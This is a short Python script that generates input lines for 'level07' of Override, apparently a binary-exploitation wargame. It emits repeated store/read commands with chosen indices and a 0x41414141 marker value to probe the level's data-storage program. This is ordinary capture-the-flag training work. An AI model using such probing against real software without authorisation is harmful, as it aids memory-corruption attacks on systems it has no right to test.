#!/usr/bin/python

import argparse

parser = argparse.ArgumentParser(description='Generate payload for level07 of Override')
parser.add_argument('--command', choices=['store', 'read'], default='read', help='Command to execute')
parser.add_argument('--max', type=int, default=1, help='Maximum number of lines to generate')
parser.add_argument('--index', type=int, default=1, help='Read a number from the data storage')
parser.add_argument('--value', type=int, default=0x41414141, help='Number to store into the data storage')

args = parser.parse_args()
for index in range(args.max):
  print args.command
  if(args.command == 'store'):
    print args.value
  print index
print 'quit'
